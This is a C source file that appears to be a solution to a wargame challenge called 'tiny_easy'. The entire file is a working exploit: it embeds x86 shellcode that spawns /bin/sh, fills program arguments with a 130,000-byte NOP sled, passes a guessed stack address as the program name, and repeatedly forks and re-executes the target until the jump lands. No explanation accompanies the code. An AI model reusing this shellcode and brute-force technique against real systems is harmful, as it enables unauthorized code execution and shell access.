#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

char *shellcode = \
     "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd"
     "\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69"
     "\x6e\x2f\x73\x68";

int main()
{
    char arg[130001];
    int status;
    memset(arg, '\x90', 130000);
    strcpy(arg + 130000 - strlen(shellcode), shellcode);

    for (;;) {
        if (0 == fork())
            execl("./tiny_easy", "\xbc\xcf\xc7\xff",
                    arg, arg, arg, arg, arg, arg, arg, arg,
                    arg, arg, arg, arg, arg, arg, arg, arg,
                    NULL);
        wait(&status);
        if (WIFEXITED(status))
            break;
    }

    return 0;
}